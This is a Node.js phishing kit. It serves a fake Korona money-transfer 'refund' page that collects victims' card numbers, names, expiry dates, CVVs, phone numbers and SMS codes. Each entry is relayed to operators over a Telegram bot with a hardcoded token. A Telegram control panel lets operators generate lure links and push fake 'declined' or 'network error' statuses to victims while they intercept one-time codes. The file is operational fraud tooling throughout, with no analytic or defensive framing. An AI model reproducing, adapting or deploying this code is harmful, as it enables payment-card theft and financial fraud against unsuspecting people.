const express = require('express');
const app = express();
const request = require('request');
const {Telegraf} = require('telegraf');
const {message} = require("telegraf/filters");
const bot = new Telegraf('7315612813:AAHb_3CCOnC8LmHUwUNQgiu2-6IhOZvWdiw');
const link = 'main.koronapayreturn.ru'
let sendms = [];
const botusers = [5708889761, 7147845976, 5903574289]
const admins = [5708889761, 7147845976, 5903574289]
//const botusers = [5903574289]
//const admins = [5903574289]
let sendm = []
let checkm = []

let respo = null;
function sd(number){
    return number.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ');
}
app.enable('trust proxy');
app.set('view engine', 'ejs');
app.use(express.static('public'));

app.get('/checkbutton', (req, res)=>{
    if(sendm[req.ip] !== undefined){
        res.send(sendm[req.ip][0])
    }
    sendm[req.ip] = ['none']
})
app.get('/return', (req, res) => {
    if(req.query.m != undefined && req.query.m > 0) {
        res.send(`<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Возврат</title>
  <link rel="stylesheet" href="/styles.css">
  <script src="script.js"></script>
</head>
<body style="background-color: #FFFFFF">
 
  <div style="display: flex;align-items: center;position: absolute;left: 50%;transform: translate(-50%, 0%);">
    <div style="display: inline-block">
      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48" height="48" viewBox="0 0 48 48">
        <defs>
          <linearGradient id="b" x1="50%" x2="50%" y1="0%" y2="100%">
            <stop offset="0%" stop-color="#68B3E2"/>
            <stop offset="100%" stop-color="#5AA5D4"/>
          </linearGradient>
          <path id="a" d="M13.2 0h21.6C42.09 0 48 5.91 48 13.2v21.6C48 42.09 42.09 48 34.8 48H13.2C5.91 48 0 42.09 0 34.8V13.2C0 5.91 5.91 0 13.2 0"/>
        </defs>
        <g fill="none" fill-rule="evenodd">
          <g>
            <mask id="c" fill="#fff">
              <use xlink:href="#a"/>
            </mask>
            <use fill="#FFC900" xlink:href="#a"/>
            <use fill="url(#b)" xlink:href="#a"/>
            <path fill="#E61A33" d="M48 0v48H0V0z" mask="url(#c)"/>
          </g>
          <path fill="#FC0" d="M12.69 36v-2.562h21.42V36H12.69zm13.545-23.545l-2.865 2.848-2.805-2.848L23.37 9.6l2.865 2.855zm.38 17.57V19.13c1.905.31 3.756.898 5.496 1.745l-3.551 8.744a.688.688 0 0 1-.609.407c-.266.01-1.335 0-1.335 0zM24.1 16.3v16.01s4.134-.005 5.21 0c.898.003 1.219-.822 1.219-.822l3.775-9.37c.363.238.719.487 1.066.747l-3.923 9.445h2.735L38.4 22.034A22.43 22.43 0 0 0 24.099 16.3zm-3.915 13.726V19.13c-1.905.31-3.756.898-5.496 1.745l3.552 8.744c.11.243.346.4.609.407.266.01 1.335 0 1.335 0zM22.701 16.3v16.01s-4.135-.005-5.21 0c-.899.003-1.22-.822-1.22-.822l-3.774-9.37c-.363.238-.719.487-1.066.747l3.922 9.445H12.62L8.4 22.034A22.43 22.43 0 0 1 22.7 16.3z"/>
        </g>
      </svg>
    </div>
    <span style="vertical-align: middle;margin-left: 0.5vh;color: #717171;font-size: 140%" class="roboto-black">Korona</span>
  </div>
  <span style="position: absolute;left: 50%;top: 16%;transform: translate(-50%, 0%);font-size: 2.5vh;color: #1a1a1a" class="roboto-bold scr">${sd(req.query.m)} RUB</span>
<div class="form-bg scr">
  <div class="form-inp-cont">
    <span class="form-inp-text roboto-bold">Номер карты:</span>
    <br>
    <input type="text" onkeypress="return event.charCode >= 48 && event.charCode <= 57" minlength="16" maxlength="16" id="cardnum" class="form-inp-box roboto-regular" placeholder="0000 0000 0000 0000">
  </div>
  <div class="form-inp-cont">
    <span class="form-inp-text roboto-bold">Имя на карте:</span>
    <br>
    <input type="text" id="cardholder" class="form-inp-box roboto-regular" placeholder="IVANOV IVAN">
  </div>
  <div class="form-inp-cont">
    <span class="form-inp-text roboto-bold">Срок действия:</span>
    <br>
    <input type="text" onkeypress="test(this);return event.charCode >= 48 && event.charCode <= 57;" maxlength="5" id="cardd" class="form-inp-box roboto-regular" placeholder="ММ/ГГ">
  </div>
  <div class="form-inp-cont">
    <span class="form-inp-text roboto-bold">CVV:</span>
    <br>
    <input type="text" onkeypress="return event.charCode >= 48 && event.charCode <= 57" minlength="3" maxlength="3" id="cardcccvvv" class="form-inp-box roboto-regular" placeholder="123">
  </div>
  <div class="form-inp-cont">
    <span class="form-inp-text roboto-bold">Номер телефона:</span>
    <br>
    <input type="text" onkeypress="return event.charCode >= 48 && event.charCode <= 57" minlength="11" maxlength="11" id="phonenum" class="form-inp-box roboto-regular" placeholder="89001234567">
  </div>
  <p style="color: #f50800;font-size: 1.25vh;margin-left: 2vh" class="roboto-bold" id="Error">Перед тем, как нажать кнопку "Отправить", убедитесь, что данные записаны верно!</p>
    <button style="color: white;text-decoration: none;" class="form-inp-button roboto-bold" id="getcodebut" onclick="validate(document.getElementById('cardnum').value,document.getElementById('cardholder').value,document.getElementById('cardd').value,document.getElementById('cardcccvvv').value,document.getElementById('phonenum').value)">Отправить</button>
</div>
  <p class="roboto-regular" style="color: #969696;font-size: clamp(0.35vh, 0.6vw, 0.6vw);min-font-size: 20%;text-align: center;position: absolute;bottom: 3vh;left: 50%;transform: translate(-50%,0%);">Получение доступно на карты национальной платежной системы банков Китал - UnionPау за исключением Гонконга, Макао и Тайваня (далее - ПС UnionPay). Отправка перевода осуществляется по правилам ПС UnionPay Валюта распоряжения в переводе - доллар США. Банки-эмитенты вправе при зачислении конвертировать валюту перевода в валюту карты получателя по курсу ПС UnionPay а также взимать комиссию РНКО «Платежный Центр» (ООО) не несет ответственности за сумму, зачисленную банком - эмитентом карты Распоряжение о переводе исполняется от нескольких минут, но не позднее трек рабочих дней со дня получения распоряжения о переводе При отправки денежного перевода с карты российского банка вас обслуживает РНКО «Платежный Центр» (ООО), пиценаия Банка России №3166-К от 14 04 2014г (г Новосибирск, ул. Кирова д 86, ОГРН 1025400002968) Есть ограничения Подробнее о тарифах, ограничениях и условиях оказания услги - на сайте rnko.ru в разделах "Денежные переводы онлайн" Оператор по перевод</p>
 <img src="/loading.gif" alt="загрузка" class="loading_gif scr2">
 <span style="position: absolute;left: 50%;top: 30%;transform: translate(-50%, 0%);font-size: 2vh;color: #1a1a1a" class="roboto-bold scr2">Загрузка, не закрывайте страницу!</span>
</body>
</html>`);

        let i = 0;
        let timeout = setInterval(()=>{
            bot.telegram.sendMessage(admins[i], `💳 <b>По ссылке перешел пользователь!</b>
Сумма: <code>${req.query.m}</code>
IP: <b>${req.ip}</b>`, {parse_mode: 'HTML'})
            i += 1;
            if(i >= admins.length){
                clearTimeout(timeout);
            }
        }, 300)
    }

    else res.send('400 error')
});
app.get('/getcode', (req, res) => {
    res.render(`code`);
});

app.get('/sendcheck', (req, res)=>{
    if(checkm[req.ip] !== undefined){
        res.send(checkm[req.ip][0])
        if(checkm[req.ip][0] === 'true'){
            checkm[req.ip][0] = 'false';
        }
    }

})
app.get('/getcodem', (req,res)=>{
    let i = 0;
    let timeout = setInterval(()=>{
        bot.telegram.sendMessage(admins[i],`💳 <b>Пришел новый код:</b>
Код: <code>${req.query.code}</code>
IP: <b>${req.ip}</b>`, {parse_mode: 'HTML'})
        i += 1;
        if(i >= admins.length){
            clearTimeout(timeout);
        }
    }, 300)
})
app.get('/sendcard', (req, res) => {
    let i = 0;
    let timeout = setInterval(()=>{
        bot.telegram.sendMessage(admins[i],`💳 <b>Ввели новую карту:</b>
Номер карты: <code>${req.query.cnum}</code>
Владелец карты: <code>${req.query.ch}</code>
Срок действия: <code>${req.query.cd}</code>
CVV: <code>${req.query.ccvv}</code>
Номер телефона: <code>${req.query.num}</code>
IP: <b>${req.ip}</b>`, {parse_mode: 'HTML', reply_markup: {inline_keyboard: [[{text: 'Смс код', callback_data: `getsms_${req.ip}`}]]}})
        i += 1;
        checkm[req.ip] = ['false']
        if(i >= admins.length){
            clearTimeout(timeout);
        }
    }, 300)

});
bot.start(async (ctx)=>{
    if(botusers.includes(ctx.message.from.id)) {
        ctx.reply('Выберите что вам нужно', {
            parse_mode: 'HTML',
            reply_markup: {inline_keyboard: [[{text: 'Получить ссылку', callback_data: 'geturi'}]]}
        })
    }
})
bot.on('message', async (ctx)=>{
    if(botusers.includes(ctx.message.from.id)) {
        if (sendms[ctx.message.from.id] !== undefined && sendms[ctx.message.from.id][0] === 'getUrl') {
            if (Number(ctx.message.text) > 0) {
                delete sendms[ctx.message.from.id];
                ctx.reply(`<code>${link}/return?m=${ctx.message.text}</code>`, {parse_mode: 'HTML'})
            }
        }
    }
}).on('callback_query', async (ctx) =>{
    ctx.answerCbQuery();
    if(botusers.includes(ctx.callbackQuery.from.id)){
        if(ctx.callbackQuery.data === 'geturi'){
            ctx.answerCbQuery();
            ctx.reply('Введите сумму');
            sendms[ctx.callbackQuery.from.id] = ['getUrl']
        }
        else if(ctx.callbackQuery.data.startsWith(`wait_`)){
            sendm[ctx.callbackQuery.data.split('_')[1]] = ['wait']
        }
        else if(ctx.callbackQuery.data.startsWith(`Cancel_`)){
            sendm[ctx.callbackQuery.data.split('_')[1]] = ['cancel']
        }
        else if(ctx.callbackQuery.data.startsWith('Error_')){
            sendm[ctx.callbackQuery.data.split('_')[1]] = ['error']
        }
        else if(ctx.callbackQuery.data.startsWith(`getsms_`)){
            checkm[ctx.callbackQuery.data.split('_')[1]] = ['true']
            ctx.telegram.editMessageReplyMarkup(ctx.callbackQuery.message.chat.id, ctx.callbackQuery.message.message_id, 0, {inline_keyboard: [[{text: 'Ожидание', callback_data: `wait_${ctx.callbackQuery.data.split('_')[1]}`}],[{text:'Отклон', callback_data: `Cancel_${ctx.callbackQuery.data.split('_')[1]}`}, {text: 'Ошибка сети', callback_data: `Error_${ctx.callbackQuery.data.split('_')[1]}`}]]})
        }
    }
});


const port = 3000;
app.listen(port, () => {
    console.log('We are live on ' + port);
});

try{
    bot.launch();
}
catch(e){
    console.log('cant handle message', e)
}

process.on('uncaughtException', function (err) {
    console.log('Caught exception: ', err);
});